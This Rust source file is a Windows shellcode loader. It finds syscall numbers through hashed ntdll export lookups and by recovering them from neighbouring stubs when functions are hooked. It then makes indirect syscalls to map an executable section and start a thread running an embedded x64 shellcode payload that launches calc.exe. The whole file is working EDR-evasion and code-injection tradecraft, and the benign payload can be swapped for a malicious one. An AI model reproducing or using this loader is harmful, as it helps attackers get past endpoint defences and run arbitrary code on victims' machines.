use std::{
    arch::global_asm,
    ffi::CStr,
    mem::zeroed,
    ptr::{copy_nonoverlapping, null_mut},
};

use ntapi::{
    ntldr::LDR_DATA_TABLE_ENTRY,
    ntmmapi::{SECTION_INHERIT, ViewShare},
    ntobapi::NtClose,
    ntpebteb::PTEB,
    ntpsapi::PPS_ATTRIBUTE_LIST,
};
use winapi::{
    ctypes::c_void,
    shared::ntdef::{PLARGE_INTEGER, POBJECT_ATTRIBUTES},
    um::{
        processthreadsapi::GetThreadId,
        synchapi::WaitForSingleObject,
        winnt::{
            ACCESS_MASK, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY,
            IMAGE_NT_HEADERS, IMAGE_NT_SIGNATURE, LARGE_INTEGER, PAGE_EXECUTE_READWRITE,
            PAGE_READWRITE, SEC_COMMIT, SECTION_ALL_ACCESS, THREAD_ALL_ACCESS,
        },
    },
};

const BUFFER: &[u8] = &[
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e,
    0x65, 0x78, 0x65, 0x00,
];

const NTCREATESECTION_HASH: u64 = 0x108635A2B9E7C9DA;
const NTMAPVIEWOFSECTION_HASH: u64 = 0x6F208A10D44E6274;
const NTUNMAPVIEWOFSECTION_HASH: u64 = 0xAC013438A1A3037;
const NTCREATETHREADEX_HASH: u64 = 0x214CEA04EBFAEF9A;

pub type PHANDLE = *mut HANDLE;
pub type HANDLE = *mut c_void;
#[allow(non_upper_case_globals)]
pub const NtCurrentProcess: HANDLE = -1isize as *mut c_void;

pub type ULONG = u32;
pub type NTSTATUS = i32;
pub type PVOID = *mut c_void;
#[allow(non_camel_case_types)]
pub type ULONG_PTR = usize;
#[allow(non_camel_case_types)]
pub type SIZE_T = ULONG_PTR;
#[allow(non_camel_case_types)]
pub type PSIZE_T = *mut ULONG_PTR;

#[allow(non_snake_case)]
pub fn NT_SUCCESS(Status: NTSTATUS) -> bool {
    Status >= 0
}

global_asm!(
    "
.section .data
    SSN: .word 0
    SYSCALL_ADDR: .quad 0

.section .text
    NtCreateSection:
        mov r10, rcx
        mov ax, [rip + SSN]
        jmp [rip + SYSCALL_ADDR]
        ret

    NtMapViewOfSection:
        mov r10, rcx
        mov ax, [rip + SSN]
        jmp [rip + SYSCALL_ADDR]
        ret

    NtUnmapViewOfSection:
        mov r10, rcx
        mov ax, [rip + SSN]
        jmp [rip + SYSCALL_ADDR]
        ret

    NtCreateThreadEx:
        mov r10, rcx
        mov ax, [rip + SSN]
        jmp [rip + SYSCALL_ADDR]
        ret
"
);

unsafe extern "C" {
    static mut SSN: u16;
    static mut SYSCALL_ADDR: *const c_void;
}

unsafe extern "system" {
    fn NtCreateSection(
        SectionHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        MaximumSize: PLARGE_INTEGER,
        SectionPageProtection: ULONG,
        AllocationAttributes: ULONG,
        FileHandle: HANDLE,
    ) -> NTSTATUS;

    fn NtMapViewOfSection(
        SectionHandle: HANDLE,
        ProcessHandle: HANDLE,
        BaseAddress: *mut PVOID,
        ZeroBits: ULONG_PTR,
        CommitSize: SIZE_T,
        SectionOffset: PLARGE_INTEGER,
        ViewSize: PSIZE_T,
        InheritDisposition: SECTION_INHERIT,
        AllocationType: ULONG,
        Win32Protect: ULONG,
    ) -> NTSTATUS;

    fn NtUnmapViewOfSection(ProcessHandle: HANDLE, BaseAddress: PVOID) -> NTSTATUS;

    fn NtCreateThreadEx(
        ThreadHandle: PHANDLE,
        DesiredAccess: ACCESS_MASK,
        ObjectAttributes: POBJECT_ATTRIBUTES,
        ProcessHandle: HANDLE,
        StartRoutine: PVOID,
        Argument: PVOID,
        CreateFlags: ULONG,
        ZeroBits: SIZE_T,
        StackSize: SIZE_T,
        MaximumStackSize: SIZE_T,
        AttributeList: PPS_ATTRIBUTE_LIST,
    ) -> NTSTATUS;

    // fn NtClose(Handle: HANDLE) -> NTSTATUS;

}

fn map_view_inject(process_handle: *mut c_void, payload: *mut c_void, payload_size: usize) {
    unsafe {
        let mut section_handle = null_mut();

        let mut maximum_size: LARGE_INTEGER = zeroed();

        let u = maximum_size.u_mut();
        u.HighPart = 0;
        u.LowPart = payload_size as u32;

        let mut sys_addr: *mut c_void = null_mut();
        let mut ssn: u16 = 0;

        ssn = get_ssn(NTCREATESECTION_HASH, &mut sys_addr);
        SYSCALL_ADDR = sys_addr;
        SSN = ssn;

        let mut status = NtCreateSection(
            &mut section_handle,
            SECTION_ALL_ACCESS,
            null_mut(),
            &mut maximum_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtCreateSection failed with error: 0x{:X}", status);
            return;
        }

        println!("[+] Section handle: {:?}", section_handle);

        let mut local_address: *mut c_void = null_mut();

        let mut view_size: usize = payload_size;

        ssn = get_ssn(NTMAPVIEWOFSECTION_HASH, &mut sys_addr);
        SYSCALL_ADDR = sys_addr;
        SSN = ssn;

        status = NtMapViewOfSection(
            section_handle,
            process_handle,
            &mut local_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            ViewShare,
            0,
            PAGE_READWRITE,
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtMapViewOfSection failed with error: 0x{:X}", status);
            NtClose(section_handle);
            return;
        }

        println!(
            "[+] Memory Allocated at: {:?} of size: {}",
            local_address, view_size
        );

        // pause();

        copy_nonoverlapping(payload as *const u8, local_address as *mut u8, payload_size);
        println!("[+] Payload written at {:?}", local_address);

        let mut remote_address: *mut c_void = null_mut();

        ssn = get_ssn(NTMAPVIEWOFSECTION_HASH, &mut sys_addr);
        SYSCALL_ADDR = sys_addr;
        SSN = ssn;

        status = NtMapViewOfSection(
            section_handle,
            process_handle,
            &mut remote_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            ViewShare,
            ViewShare,
            PAGE_EXECUTE_READWRITE,
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtMapViewOfSection failed with error: 0x{:X}", status);
        }

        println!(
            "[+] Remote Memory Allocated at: {:?} of size: {}",
            remote_address, view_size
        );

        // pause();

        ssn = get_ssn(NTCREATETHREADEX_HASH, &mut sys_addr);
        SYSCALL_ADDR = sys_addr;
        SSN = ssn;
        let mut thread_handle = null_mut();

        status = NtCreateThreadEx(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut(),
            process_handle,
            remote_address,
            null_mut(),
            0,
            0,
            0,
            0,
            null_mut(),
        );

        if !NT_SUCCESS(status) {
            println!("[-] NtCreateThreadEx failed with error: 0x{:X}", status);
        }

        println!(
            "[+] Thread Created with ID: {:?}",
            GetThreadId(thread_handle)
        );

        WaitForSingleObject(thread_handle, 0xFFFFFFFF);

        ssn = get_ssn(NTUNMAPVIEWOFSECTION_HASH, &mut sys_addr);
        SYSCALL_ADDR = sys_addr;
        SSN = ssn;
        status = NtUnmapViewOfSection(process_handle, local_address);

        // pause();

        if !NT_SUCCESS(status) {
            println!("[-] NtUnmapViewOfSection failed with error: 0x{:X}", status);
        }

        status = NtClose(section_handle);

        if !NT_SUCCESS(status) {
            println!("[-] NtClose failed with error: 0x{:X}", status);
        }
    }
}

fn djb2_hash(input: &[u8]) -> u64 {
    let mut hash: u64 = 0x77347734DEADBEEF;

    for byte in input {
        hash = (hash << 5).wrapping_add(hash).wrapping_add(*byte as u64);
    }

    hash
}

fn get_current_teb() -> PTEB {
    unsafe {
        let mut teb: PTEB = null_mut();
        #[cfg(target_arch = "x86_64")]
        std::arch::asm!(
            "mov {}, gs:[0x30]",
            out(reg) teb,
        );
        #[cfg(target_arch = "x86")]
        std::arch::asm!(
            "mov {}, fs:[0x18]",
            out(reg) teb,
        );
        teb
    }
}

fn get_image_export_directory(
    module_base: *const u8,
    image_export_directory: *mut *mut IMAGE_EXPORT_DIRECTORY,
) -> bool {
    unsafe {
        let dos_header = module_base as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS header");
            return false;
        }

        let nt_header = (module_base as *const u8).add((*dos_header).e_lfanew as usize)
            as *const IMAGE_NT_HEADERS;

        if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
            print!("[-] Invalid NT header");
            return false;
        }

        *image_export_directory = (module_base as *const u8)
            .add((*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize)
            as *mut IMAGE_EXPORT_DIRECTORY;

        if image_export_directory.is_null() {
            println!("[-] No export directory found");
            return false;
        }

        return true;
    }
}

fn get_hooked_function_ssn(current_func: *const u8, sys_addr: &mut *mut c_void) -> u16 {
    unsafe {
        let mut prev_stub_count = 0;

        while prev_stub_count < 20 {
            let check_addr = current_func.offset(-(prev_stub_count as isize * 0x20));

            if *check_addr.offset(0) == 0x4C
                && *check_addr.offset(1) == 0x8B
                && *check_addr.offset(2) == 0xD1
                && *check_addr.offset(3) == 0xB8
                && *check_addr.offset(6) == 0x00
                && *check_addr.offset(7) == 0x00
            {
                let curr_ssn_low = *check_addr.offset(4) as u16;
                let curr_ssn_high = *check_addr.offset(5) as u16;
                let curr_ssn = (curr_ssn_high << 8) | curr_ssn_low;

                let target_ssn = curr_ssn + (prev_stub_count as u16);

                // println!(
                //     "[+] Found unhooked stub at Offset -{} stubs",
                //     prev_stub_count
                // );
                // println!(
                //     "[+] Current SSN: 0x{:X}, Target SSN: 0x{:X}",
                //     curr_ssn, target_ssn
                // );

                // println!(
                //     "[+] Syscall Address: {:?}",
                //     current_func.offset(18) as *const c_void
                // );

                *sys_addr = current_func.offset(18) as *mut c_void;

                return target_ssn;
            }

            prev_stub_count += 1;
        }
    }
    return 0;
}

fn get_ssn(hash: u64, sys_addr: &mut *mut c_void) -> u16 {
    unsafe {
        let teb = get_current_teb();

        let peb = (*teb).ProcessEnvironmentBlock;

        if teb.is_null() || peb.is_null() || (*peb).OSMajorVersion != 10 {
            println!("[-] Invalid PEB");
            return 0;
        }

        let ldr_data_entry = ((*(*(*peb).Ldr).InMemoryOrderModuleList.Flink).Flink as *const u8)
            .offset(-0x10) as *const LDR_DATA_TABLE_ENTRY;

        let ntdll_base = (*ldr_data_entry).DllBase as *const u8;

        let mut export_directory: *mut IMAGE_EXPORT_DIRECTORY = null_mut();

        if !get_image_export_directory(ntdll_base, &mut export_directory) {
            println!("[-] Failed to get export directory");
            return 0;
        }

        let address_of_functions = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfFunctions as usize)
            as *const u32;

        let address_of_names = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNames as usize)
            as *const u32;

        let address_of_name_ordinals = (ntdll_base as *const u8)
            .add((*export_directory).AddressOfNameOrdinals as usize)
            as *const u16;

        for func in 0..(*export_directory).NumberOfFunctions as isize {
            let func_name =
                (ntdll_base as *const u8).add(*address_of_names.offset(func) as usize) as *const i8;

            let oridinal = *address_of_name_ordinals.offset(func) as usize;

            if oridinal >= (*export_directory).NumberOfFunctions as usize {
                continue;
            }

            let function_rva = *address_of_functions.add(oridinal) as usize;
            let function_address = (ntdll_base as *const u8).add(function_rva as usize);

            let c_str = CStr::from_ptr(func_name);

            if let Ok(func_str) = c_str.to_str() {
                if djb2_hash(func_str.to_lowercase().as_bytes()) == hash {
                    // println!(
                    //     "[+] Found function: {} at address: {:?}",
                    //     func_str, function_address
                    // );
                    for i in 0..32 {
                        let bytes = function_address as *const u8;
                        let mut ssn: u16 = 0;

                        if *bytes.offset(i) == 0x4C
                            && *bytes.offset(i + 1) == 0x8B
                            && *bytes.offset(i + 2) == 0xD1
                            && *bytes.offset(i + 3) == 0xB8
                            && *bytes.offset(i + 6) == 0x00
                            && *bytes.offset(i + 7) == 0x00
                        {
                            println!("[+] {} is not hooked, extracting SSN...", func_str);

                            let low = *bytes.offset(i + 4) as u16;
                            let high = *bytes.offset(i + 5) as u16;
                            ssn = (high << 8) | low;
                            // println!(
                            //     "[+] Found syscall number: 0x{:X} for function: {} at address: {:?}",
                            //     ssn, func_str, function_address
                            // );

                            *sys_addr = function_address.offset(i + 18) as *mut c_void;
                            // println!(
                            //     "[+] Syscall Address: {:?}",
                            //     function_address.offset(byte + i + 18)
                            // );
                        } else {
                            println!(
                                "[+] {} is hooked, attempting to find unhooked stub...",
                                func_str
                            );
                            ssn = get_hooked_function_ssn(function_address, sys_addr);
                        }

                        return ssn;
                    }
                }
            }
        }
    }
    return 0;
}

fn pause() {
    println!("Press Enter to continue...");
    let mut input = String::new();
    std::io::stdin().read_line(&mut input).unwrap();
}

fn main() {
    let process_handle = NtCurrentProcess;
    let payload = BUFFER.as_ptr();
    let payload_size = BUFFER.len();

    map_view_inject(process_handle, payload as *mut c_void, payload_size);

    // let apis: Vec<String> = vec![
    //     "NtCreateSection".to_string(),
    //     "NtMapViewOfSection".to_string(),
    //     "NtUnmapViewOfSection".to_string(),
    //     "NtCreateThreadEx".to_string(),
    // ];

    // for api in apis {
    //     let hash = djb2_hash(api.to_lowercase().as_bytes());
    //     println!("const {}_HASH: u64 = 0x{:X};", api.to_uppercase(), hash);
    // }

    // let hashes: Vec<u64> = vec![
    //     NTCREATESECTION_HASH,
    //     NTMAPVIEWOFSECTION_HASH,
    //     NTUNMAPVIEWOFSECTION_HASH,
    //     NTCREATETHREADEX_HASH,
    // ];

    // let mut syscall_address: *mut c_void = null_mut();

    // for hash in hashes {
    //     let ssn = get_ssn(hash, &mut syscall_address);
    //     print!("SSN: 0x{:X}, SSN Address: {:?}\n", ssn, syscall_address);
    // }
}
